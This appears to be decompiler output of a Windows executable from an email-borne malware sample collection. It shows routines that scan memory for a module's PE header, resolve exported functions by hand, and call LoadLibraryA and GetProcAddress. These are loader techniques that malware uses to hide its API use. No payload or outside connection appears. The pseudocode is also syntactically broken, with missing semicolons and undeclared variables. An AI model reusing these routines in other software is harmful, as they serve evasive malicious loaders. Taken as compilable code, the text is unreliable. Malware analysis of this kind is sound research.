// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0750/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401201(Eq_9 eax, word32 ebp, Eq_5 * fs)
{
	fs->dw0000 = fp - 0x00000008;
	Eq_8 * edi_18 = DPB(eax, ax & 0x1000, 0, 16);
	while (true)
	{
		globals->dw403749 = fp - 0x00000008;
		globals->dw40374D = ebp;
		globals->ptr403751 = edi_18;
		if (edi_18->w0000 == 0x5A4D)
		{
			edi_18 = edi_18 + Mem23[edi_18 + 0x0000003C:word32];
			if (edi_18->w0000 == 0x4550)
			{
				fs->dw0000 = dwLoc0C;
				return;
			}
		}
l00401253:
		edi_18 = edi_18 - 0x00001000;
	}
}

word32 fn0040126F(Eq_45 * esi, Eq_49 * edi)
{
	word32 edx_15 = 0x00000000;
	while (true)
	{
		esi_20 = esi;
		do
		{
			Eq_45 * esi_20;
			if (esi_41->b0000 == 0x00)
				return edx_15;
			esi_20 = esi_41 + 0x00000001;
			edi = edi_40 + 0x00000001;
			Eq_49 * edi_40 = edi;
			Eq_45 * esi_41 = esi_20;
		} while (esi_41->b0000 == edi_40->b0000);
		do
		{
			edi = edi_42 + 0x00000001;
			Eq_49 * edi_42 = edi;
		} while (0x00 != edi_42->b0000);
		edx_15 = edx_15 + 0x00000001;
	}
}

byte fn00401287(Eq_9 eax, Eq_9 ebx)
{
	Mem0[0x004081C6:word32]();
	if (eax == 0xFFFFFFFE)
		ebx = globals->t4020F5;
	word32 ebp_28 = Mem0[ebx + Mem0[ebx + 0x0000003C:word32] + 0x00000078:word32] + ebx;
	word32 eax_44 = Mem0[ebp_28 + 0x00000024:word32] + ebx + 0x00000002 + fn0040126F(&globals->t4020F5, Mem0[Mem0[ebp_28 + 0x00000020:word32] + ebx:word32] + ebx) * 0x00000002 - Mem0[ebp_28 + 0x00000010:word32] * 0x00000002;
	word32 eax_51 = (Mem0[ebp_28 + 0x0000001C:word32] + ebx)[(DPB(eax_44, Mem0[eax_44 + 0x00000000:word16], 0, 16) & 0x0000FFFF) * 0x00000004] + ebx;
	globals->t4020F5 = eax_51;
	return (byte) eax_51;
}

void fn004012E7(Eq_9 ebx, word32 ebp, Eq_5 * fs)
{
fn004012E7_entry:
l004012E7:
l0040133E:
l00401341:
	globals->t4020F5 = LoadLibraryA(0x00402072);
	globals->t4081C6 = GetProcAddress(globals->t4020F5, 0x00402048);
	Eq_9 eax_14 = globals->t4081C6
	fn00401201(eax_14, ebp, fs)
	globals->t4020F5 = eax_14;
	Mem18[0x004081C6:word32]()
l0040137E:
	branch eax_14 != 0xFFFFFFFE l0040137E
l00401381:
	fn00401287(eax_14, ebx)
	fp->dwFFFFFFFC = 0x00000000;
l00401396:
fn004012E7_exit:
}

